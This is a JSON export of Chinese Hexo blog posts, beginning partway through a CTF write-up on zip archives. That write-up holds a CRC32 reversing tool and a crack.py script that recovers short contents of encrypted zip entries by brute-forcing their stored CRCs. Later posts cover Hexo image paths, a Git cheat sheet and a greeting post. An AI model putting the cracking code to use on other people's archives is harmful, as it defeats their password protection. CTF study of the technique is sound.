table if reverse: table_reverse = [] found_none = set() found_multiple = set() for i in range(256): found = [] for j in range(256): if table[j] &gt;&gt; 24 == i: found.append(j) table_reverse.append(tuple(found)) if not found: found_none.add(i) elif len(found) &gt; 1: found_multiple.add(i) assert len(table_reverse) == 256, \"reverse table is wrong size\" if found_multiple: out('WARNING: Multiple table entries have an MSB in &#123;0&#125;'.format( rangess(found_multiple))) if found_none: out('ERROR: no MSB in the table equals bytes in &#123;0&#125;'.format( rangess(found_none)))def calc(data, accum=0): accum = ~accum for b in data: accum = table[(accum ^ b) &amp; 0xFF] ^ ((accum &gt;&gt; 8) &amp; 0x00FFFFFF) accum = ~accum return accum &amp; 0xFFFFFFFFdef rewind(accum, data): if not data: return (accum,) stack = [(len(data), ~accum)] solutions = set() while stack: node = stack.pop() prev_offset = node[0] - 1 for i in table_reverse[(node[1] &gt;&gt; 24) &amp; 0xFF]: prevCRC = (((node[1] ^ table[i]) &lt;&lt; 8) | (i ^ data[prev_offset])) &amp; 0xFFFFFFFF if prev_offset: stack.append((prev_offset, prevCRC)) else: solutions.add((~prevCRC) &amp; 0xFFFFFFFF) return solutionsdef findReverse(desired, accum): solutions = set() accum = ~accum stack = [(~desired,)] while stack: node = stack.pop() for j in table_reverse[(node[0] &gt;&gt; 24) &amp; 0xFF]: if len(node) == 4: a = accum data = [] node = node[1:] + (j,) for i in range(3, -1, -1): data.append((a ^ node[i]) &amp; 0xFF) a &gt;&gt;= 8 a ^= table[node[i]] solutions.add(tuple(data)) else: stack.append(((node[0] ^ table[j]) &lt;&lt; 8,) + node[1:] + (j,)) return solutions# Toolsdef parse_dword(x): return int(x, 0) &amp; 0xFFFFFFFFdef reverseBits(x): # http://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel # http://stackoverflow.com/a/20918545 x = ((x &amp; 0x55555555) &lt;&lt; 1) | ((x &amp; 0xAAAAAAAA) &gt;&gt; 1) x = ((x &amp; 0x33333333) &lt;&lt; 2) | ((x &amp; 0xCCCCCCCC) &gt;&gt; 2) x = ((x &amp; 0x0F0F0F0F) &lt;&lt; 4) | ((x &amp; 0xF0F0F0F0) &gt;&gt; 4) x = ((x &amp; 0x00FF00FF) &lt;&lt; 8) | ((x &amp; 0xFF00FF00) &gt;&gt; 8) x = ((x &amp; 0x0000FFFF) &lt;&lt; 16) | ((x &amp; 0xFFFF0000) &gt;&gt; 16) return x &amp; 0xFFFFFFFF# Compatibility with Python 2.6 and earlier.if hasattr(int, \"bit_length\"): def bit_length(num): return num.bit_length()else: def bit_length(n): if n == 0: return 0 bits = -32 m = 0 while n: m = n n &gt;&gt;= 32 bits += 32 while m: m &gt;&gt;= 1 bits += 1 return bitsdef check32(poly): if poly &amp; 0x80000000 == 0: out('WARNING: polynomial degree (&#123;0&#125;) != 32'.format(bit_length(poly))) out(' instead, try') out(' 0x&#123;0:08x&#125; (reversed/lsbit-first)'.format(poly | 0x80000000)) out(' 0x&#123;0:08x&#125; (normal/msbit-first)'.format(reverseBits(poly | 0x80000000)))def reciprocal(poly): ''' Return the reversed reciprocal (Koopman notatation) polynomial of a reversed (lsbit-first) polynomial ''' return reverseBits((poly &lt;&lt; 1) | 1)def print_num(num): ''' Write a numeric result in various forms ''' out('hex: 0x&#123;0:08x&#125;'.format(num)) out('dec: &#123;0:d&#125;'.format(num)) out('oct: 0o&#123;0:011o&#125;'.format(num)) out('bin: 0b&#123;0:032b&#125;'.format(num))import itertoolsdef ranges(i): for kg in itertools.groupby(enumerate(i), lambda x: x[1] - x[0]): g = list(kg[1]) yield g[0][1], g[-1][1]def rangess(i): return ', '.join(map(lambda x: '[&#123;0&#125;,&#123;1&#125;]'.format(*x), ranges(i)))# Parsersdef get_parser(): ''' Return the command-line parser ''' parser = argparse.ArgumentParser( description=\"Reverse, undo, and calculate CRC32 checksums\") subparsers = parser.add_subparsers(metavar='action') poly_flip_parser = argparse.ArgumentParser(add_help=False) subparser_group = poly_flip_parser.add_mutually_exclusive_group() subparser_group.add_argument( '-m', '--msbit', dest=\"msb\", action='store_true', help='treat the polynomial as normal (msbit-first)') subparser_group.add_argument('-l', '--lsbit', action='store_false', help='treat the polynomial as reversed (lsbit-first) [default]') desired_poly_parser = argparse.ArgumentParser(add_help=False) desired_poly_parser.add_argument( 'desired', type=str, help='[int] desired checksum') default_poly_parser = argparse.ArgumentParser(add_help=False) default_poly_parser.add_argument( 'poly', default='0xEDB88320', type=str, nargs='?', help='[int] polynomial [default: 0xEDB88320]') accum_parser = argparse.ArgumentParser(add_help=False) accum_parser.add_argument( 'accum', type=str, help='[int] accumulator (final checksum)') default_accum_parser = argparse.ArgumentParser(add_help=False) default_accum_parser.add_argument( 'accum', default='0', type=str, nargs='?', help='[int] starting accumulator [default: 0]') outfile_parser = argparse.ArgumentParser(add_help=False) outfile_parser.add_argument('-o', '--outfile', metavar=\"f\", type=argparse.FileType('w'), default=sys.stdout, help=\"Output to a file instead of stdout\") infile_parser = argparse.ArgumentParser(add_help=False) subparser_group = infile_parser.add_mutually_exclusive_group() subparser_group.add_argument('-i', '--infile', metavar=\"f\", type=argparse.FileType('rb'), default=sys.stdin, help=\"Input from a file instead of stdin\") subparser_group.add_argument('-s', '--str', metavar=\"s\", type=str, default='', dest='instr', help=\"Use a string as input\") subparser = subparsers.add_parser('flip', parents=[outfile_parser], help=\"flip the bits to convert normal(msbit-first) polynomials to reversed (lsbit-first) and vice versa\") subparser.add_argument('poly', type=str, help='[int] polynomial') subparser.set_defaults( func=lambda: print_num(reverseBits(parse_dword(args.poly)))) subparser = subparsers.add_parser('reciprocal', parents=[outfile_parser], help=\"find the reciprocal (Koopman notation) of a reversed (lsbit-first) polynomial and vice versa\") subparser.add_argument('poly', type=str, help='[int] polynomial') subparser.set_defaults(func=reciprocal_callback) subparser = subparsers.add_parser('table', parents=[outfile_parser, poly_flip_parser, default_poly_parser], help=\"generate a lookup table for a polynomial\") subparser.set_defaults(func=table_callback) subparser = subparsers.add_parser('reverse', parents=[ outfile_parser, poly_flip_parser, desired_poly_parser, default_accum_parser, default_poly_parser], help=\"find a patch that causes the CRC32 checksum to become a desired value\") subparser.set_defaults(func=reverse_callback) subparser = subparsers.add_parser('undo', parents=[ outfile_parser, poly_flip_parser, accum_parser, default_poly_parser, infile_parser], help=\"rewind a CRC32 checksum\") subparser.add_argument('-n', '--len', metavar='l', type=str, default='0', help='[int] number of bytes to rewind [default: 0]') subparser.set_defaults(func=undo_callback) subparser = subparsers.add_parser('calc', parents=[ outfile_parser, poly_flip_parser, default_accum_parser, default_poly_parser, infile_parser], help=\"calculate the CRC32 checksum\") subparser.set_defaults(func=calc_callback) return parserdef reciprocal_callback(): poly = parse_dword(args.poly) check32(poly) print_num(reciprocal(poly))def table_callback(): # initialize tables init_tables(get_poly(), False) # print table out('[&#123;0&#125;]'.format(', '.join(map('0x&#123;0:08x&#125;'.format, table))))def reverse_callback(): # initialize tables init_tables(get_poly()) # find reverse bytes desired = parse_dword(args.desired) accum = parse_dword(args.accum) # 4-byte patch patches = findReverse(desired, accum) for patch in patches: out('4 bytes: &#123;&#123;0x&#123;0:02x&#125;, 0x&#123;1:02x&#125;, 0x&#123;2:02x&#125;, 0x&#123;3:02x&#125;&#125;&#125;'.format(*patch)) checksum = calc(patch, accum) out('verification checksum: 0x&#123;0:08x&#125; (&#123;1&#125;)'.format( checksum, 'OK' if checksum == desired else 'ERROR')) # 6-byte alphanumeric patches for i in permitted_characters: for j in permitted_characters: patch = [i, j] patches = findReverse(desired, calc(patch, accum)) for last_4_bytes in patches: if all(p in permitted_characters for p in last_4_bytes): patch.extend(last_4_bytes) out('alternative: &#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;5&#125;&#123;6&#125; (&#123;0&#125;)'.format( 'OK' if calc(patch, accum) == desired else 'ERROR', *map(chr, patch)))def undo_callback(): # initialize tables init_tables(get_poly()) # calculate checksum accum = parse_dword(args.accum) maxlen = int(args.len, 0) data = get_input() if not 0 &lt; maxlen &lt;= len(data): maxlen = len(data) out('rewinded &#123;0&#125;/&#123;1&#125; (&#123;2:.2f&#125;%)'.format(maxlen, len(data), maxlen * 100.0 / len(data) if len(data) else 100)) for solution in rewind(accum, data[-maxlen:]): out('') print_num(solution)def calc_callback(): # initialize tables init_tables(get_poly(), False) # calculate checksum accum = parse_dword(args.accum) data = get_input() out('data len: &#123;0&#125;'.format(len(data))) out('') print_num(calc(data, accum))def main(argv=None): ''' Runs the program and handles command line options ''' parser = get_parser() # Parse arguments and run the function global args args = parser.parse_args(argv) args.func()if __name__ == '__main__': main() # pragma: no cover 示例： 当字节数小于6时，用下面的crack.py脚本（用python3）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#!/usr/bin/env python3import sysimport osimport stringimport collectionsimport argparseparser = argparse.ArgumentParser()parser.add_argument('file', nargs='*')parser.add_argument('--hex', action='append')parser.add_argument('--dec', action='append')parser.add_argument('--limit', type=int)parser.add_argument('--compiler', default='g++')parser.add_argument('--alphabet', type=os.fsencode, default=string.printable.encode())args = parser.parse_args()targets = collections.OrderedDict()limit = 0crcs = []if args.limit: limit = max(limit, args.limit)if args.hex or args.dec: if not args.limit: parser.error('Limit of length not specified')if args.hex: for s in args.hex: crc = int(s, 16) targets[s] = crc for l in range(args.limit + 1): crcs += [( crc, l )]if args.dec: for s in args.dec: crc = int(s) targets[s] = crc for l in range(args.limit + 1): crcs += [( crc, l )]if args.file: print('reading zip files...', file=sys.stderr) import zipfile for zipname in args.file: fh = zipfile.ZipFile(zipname) for info in fh.infolist(): targets['%s / %s' % ( zipname, info.filename )] = ( info.CRC, info.file_size ) crcs += [( info.CRC, info.file_size )] limit = max(limit, info.file_size) print('file found: %s / %s: crc = 0x%08x, size = %d' % (zipname, info.filename, info.CRC, info.file_size), file=sys.stderr)if not crcs: parser.error('No CRCs given')# compiling c++ in python script is the easy way to have the both a good interface and better speedcode = ''code += r'''#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;array&gt;#include &lt;string&gt;#include &lt;set&gt;#include &lt;cstdint&gt;#include &lt;cctype&gt;#define repeat(i,n) for (int i = 0; (i) &lt; (n); ++(i))using namespace std;uint32_t crc_table[256];void make_crc_table() &#123; repeat (i, 256) &#123; uint32_t c = i; repeat (j, 8) &#123; c = (c &amp; 1) ? (0xedb88320 ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1); &#125; crc_table[i] = c; &#125;&#125;const uint32_t initial_crc32 = 0xffffffff;uint32_t next_crc32(uint32_t c, char b) &#123; return crc_table[(c ^ b) &amp; 0xff] ^ (c &gt;&gt; 8);&#125;const uint32_t mask_crc32 = 0xffffffff;const char alphabet[] = &#123; ''' + ', '.join(map(str, args.alphabet)) + r''' &#125;;const int limit = ''' + str(limit) + r''';array&lt;set&lt;uint32_t&gt;, limit+1&gt; crcs;string stk;void dfs(uint32_t crc) &#123; if (crcs[stk.length()].count(crc ^ mask_crc32)) &#123; fprintf(stderr, \"crc found: 0x%08x: \\\"\", crc ^ mask_crc32); for (char c : stk) fprintf(stderr, isprint(c) &amp;&amp; (c != '\\\\') ? \"%c\" : \"\\\\x%02x\", c); fprintf(stderr, \"\\\"\\n\"); printf(\"%08x \", crc ^ mask_crc32); for (char c : stk) printf(\" %02x\", c); printf(\"\\n\"); &#125; if (stk.length() &lt; limit) &#123; for (char c : alphabet) &#123; stk.push_back(c); dfs(next_crc32(crc, c)); stk.pop_back(); &#125; &#125;&#125;int main() &#123;'''for crc, size in crcs: code += ' crcs[' + str(size) + '].insert(' + hex(crc) + ');\\n'code += r''' make_crc_table(); dfs(initial_crc32); return 0;&#125;'''import tempfileimport subprocesswith tempfile.TemporaryDirectory() as tmpdir: cppname = os.path.join(tmpdir, 'a.cpp') with open(cppname, 'w') as fh: fh.write(code) binname = os.path.join(tmpdir, 'a.out') print('compiling...', file=sys.stderr) p = subprocess.check_call([args.compiler, '-std=c++11', '-O3', '-o', binname, cppname]) print('searching...', file=sys.stderr) p = subprocess.Popen([binname], stdout=subprocess.PIPE) output, _ = p.communicate()print('done', file=sys.stderr)print(file=sys.stderr)result = collections.defaultdict(list)for line in output.decode().strip().split('\\n'): crc, *val = map(lambda x: int(x, 16), line.split()) result[( crc, len(val) )] += [ bytes(val) ]for key, crc in targets.items(): for s in result[crc]: print('%s : %s' % (key, repr(s)[1:])) 示例： 0x06 MORE还有很多压缩包的密码需要联系题中的其他文件来解，这个就不在本篇的讨论范围内了，故不再讨论。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://cyris.pen.moe/tags/CTF/"}]},{"title":"Hexo 博客图片问题解决办法","date":"2017-07-12T11:46:06.000Z","path":"posts/blog-picture-issue/","text":"关于hexo博客图片无法正常显示的问题的解决办法。 之前一直用的MarkdownPad2自带的添加图片按钮来添加图片（存储在hexo/source/imag里），但是经常会有显示不出的情况，不喜欢用各大图床，于是查了一波本地存储上传的方法，找到了一个插件来修正img标签以使图片正常显示。 参考自简书。 0x01 Asset设定确认首先确认_config.yml 中有 post_asset_folder:true。这时候每次hexo new会自动建立一个与文章同名的文件夹，我们可以把与该文章相关的所有资源都放到那个文件夹，来更方便得调用资源。 0x02 插件添加在hexo文件夹执行： npm install https://github.com/CodeFalling/hexo-asset-image –save 0x03 图片添加完成安装后新建一个文件试试，发现在.md文件同级目录下会有一个同名文件夹。比如我们新建了一个文件blog-picture-issue.md，然后在同名文件夹里放张图：1.png。 之后在原图片引用语句的括号里写入： blog-picture-issue/1.PNG 就能看到正常显示的图片了： 注：[]里是图片的名称，可不写。 0x04 issued这样的操作以后生成的html是： 1&lt;img src=\"/2017/07/12/blog-picture-issue/1.PNG\" alt=\"logo\"&gt; 而非之前的： 1&lt;img src=\"blog-picture-issue/1.PNG\" alt=\"logo\"&gt;” 使得图片正常显示。","tags":[{"name":"HEXO","slug":"HEXO","permalink":"https://cyris.pen.moe/tags/HEXO/"}]},{"title":"GIT 时光机","date":"2017-05-12T16:17:27.000Z","path":"posts/git/","text":"Ak师傅的小灶上谈了些关于git的常见用法，回去以后做了些整理。 参考链接： Aklis写的wiki阮一峰的git教程廖雪峰的git教程 一、时光机硬件说明书 Workspace： 工作区 Index / Stage： 暂存区 Repository： 本地仓库 Remote： 远程仓库 HEAD： 当前分支 Commit history： 历史记录 0X01 零件组装这里有三种情况： 1234567891. 在当前目录新建一个Git代码库(如果是要使用github上的库，需要先pull下来，不然无法push到目标库，这里的第三种方法就可以。)$ git init2. 新建目录，将其初始化为Git仓库$ git init project-name3. pull下来一个项目与其代码历史$ git clone URL 0X02 时光机的配置Git有个设置文件.gitconfig，它可以全局配置，也可以项目配置。 1234567891.显示当前的Git配置$ git config --list2.编辑Git配置文件$ git config -e [--global]3.设置提交代码时的用户信息$ git config [--global] user.name \"name\"$ git config [--global] user.email \"email address\" 0X03 在时光机上注入add钙奶12345678910111213141516171819201.添加指定文件到暂存区$ git add file1 file2 ... 2.添加指定目录到暂存区（包括其中的子目录）$ git add dir（文件夹名称）3.添加当前目录所有文件到暂存区$ git add .4.分次提交$ git add -p5.删除工作区文件，并且把这次删除放入暂存区$ git rm file1 file2 ...6.停止追踪指定文件（该文件会保留在工作区）$ git rm --cached file7.改名文件，然后把这个改名文件放入暂存区$ git mv file-original file-renamed 0X04 挪挪挪，挪进仓库12345678910111213141516171.提交暂存区到仓库区$ git commit -m \"message\"2.提交暂存区指定文件到仓库区$ git commit file1 file2 ... -m \"message\"3.提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a4.提交时显示所有diff信息$ git commit -v5.使用一次新的commit，替代上一次提交。如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m \"message\"6.重做上一次commit，并包括指定文件的新变化$ git commit --amend file1 file2 ... 0X05 时光机分机1234567891011121314151617181920212223242526272829303132333435363738394041421.列出所有本地分支$ git branch2.列出所有远程分支$ git branch -r3.列出所有本地分支和远程分支$ git branch -a4.新建一个分支，但依然停留在当前分支$ git branch [branch-name]5.新建一个分支，并切换到该分支$ git checkout -b [branch]6.新建一个分支，指向指定commit$ git branch [branch] [commit]7.新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]8.切换到指定分支，并更新工作区$ git checkout [branch-name]9.切换到上一个分支$ git checkout -10.建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]11.合并指定分支到当前分支$ git merge [branch]12.选择一个commit，合并进当前分支$ git cherry-pick [commit]13.删除分支$ git branch -d [branch-name]14.删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch] 0X06 Tag12345678910111213141516171819202122232425261.列出所有tag$ git tag2.新建一个tag在当前commit$ git tag [tag]3.新建一个tag在指定commit$ git tag [tag] [commit]4.删除本地tag$ git tag -d [tag]5.删除远程tag$ git push origin :refs/tags/[tagName]6.查看tag信息$ git show [tag]7.提交指定tag$ git push [remote] [tag]8.提交所有tag$ git push [remote] --tags9.新建一个分支，指向某个tag$ git checkout -b [branch] [tag] 0X07 信息查看1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859601.显示有变更的文件$ git status2.显示当前分支的版本历史$ git log3.显示commit历史，以及每次commit发生变更的文件$ git log --stat4.搜索提交历史，根据关键词$ git log -S [keyword]5.显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s6.显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件$ git log [tag] HEAD --grep feature7.显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]8.显示指定文件相关的每一次diff$ git log -p [file]9.显示过去5次提交$ git log -5 --pretty --oneline10.显示所有提交过的用户，按提交次数排序$ git shortlog -sn11.显示指定文件是什么人在什么时间修改过$ git blame [file]12.显示暂存区和工作区的差异$ git diff13.显示暂存区和上一个commit的差异$ git diff --cached [file]14.显示工作区与当前分支最新commit之间的差异$ git diff HEAD15.显示两次提交之间的差异$ git diff [first-branch]...[second-branch]16.显示今天你写了多少行代码$ git diff --shortstat \"@&#123;0 day ago&#125;\"17.显示某次提交的元数据和内容变化$ git show [commit]18.显示某次提交发生变化的文件$ git show --name-only [commit]19.显示某次提交时，某个文件的内容$ git show [commit]:[filename]20.显示当前分支的最近几次提交$ git reflog 0X08 远程同步篇12345678910111213141516171819202122231.下载远程仓库的所有变动$ git fetch [remote]2.显示所有远程仓库$ git remote -v3.显示某个远程仓库的信息$ git remote show [remote]4.增加一个新的远程仓库，并命名$ git remote add [shortname] [url]5.取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]6.上传本地指定分支到远程仓库$ git push [remote] [branch]7.强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force8.推送所有分支到远程仓库$ git push [remote] --all 0X09 时光回溯篇1234567891011121314151617181920212223242526272829301.恢复暂存区的指定文件到工作区$ git checkout [file]2.恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]3.恢复暂存区的所有文件到工作区$ git checkout .4.重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]5.重置暂存区与工作区，与上一次commit保持一致$ git reset --hard6.重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]7.重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]8.重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]9.新建一个commit，用来撤销指定commit，后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]10.暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop 二、Github与信仰 这个周目是关于Linux下git时光机的实际应用 —— 把已有项目推到Github上。 Github账号的创建与git的安装配置不再作说明。 1X01 设置Git设置用户名与email： 12git config --global user.name \"your name\"git config --global user.email \"youremail@lalala.com\" 此时在/home下会新建一个.gitconfig文件 1X02 配置SSH1.创建SSH Key 1$ ssh-keygen -t rsa -C \"youremail@lalala.com\" 系统会提示key的保存位置，一般为~/.ssh，接下来会请求输入口令，一路默认，敲三次回车即可。 然后登陆gayhub -&gt; Accounting settings -&gt; SSH key -&gt; Add SSH Key -&gt; 取个容易区分的名字 -&gt; 把~/.ssh/id_rsa.pub文件中的内容粘贴上去即可。 用下面的命令进行测试： 1ssh -T git@github.com 1X03 push and pull from github1.在新建的~/My_Message_Board目录中git clone已存在GitHub上的Repository 1git clone URL 2.先修改个readme，提交。 1234567sudo vi README.mdgit statusgit add README.mdgit statusgit commit -m \"Cyris readme-change 5/17\"git statusgit remote add origin URL 报了个错： 1fatal: remote origin already exists. 解决方法： 1$ git remote rm origin 再来。 1$ git remote add origin URL（这些URL都是github里复制的URL） 3.下面把它push上去 1$ git push -u origin master 这里会要求输入GitHub账户的用户名和密码。输入即可。 4.提交完成，去GitHub看眼Repository。内容修改成功。","tags":[{"name":"GIT","slug":"GIT","permalink":"https://cyris.pen.moe/tags/GIT/"},{"name":"Wiki","slug":"Wiki","permalink":"https://cyris.pen.moe/tags/Wiki/"}]},{"title":"Hello World","date":"2017-04-04T08:19:49.000Z","path":"posts/acaleph/","text":"干净，深刻，精致。这是那一刻的绿生，所带给我的欣喜。 Hello World.","tags":[{"name":"煮字","slug":"煮字","permalink":"https://cyris.pen.moe/tags/煮字/"}]}]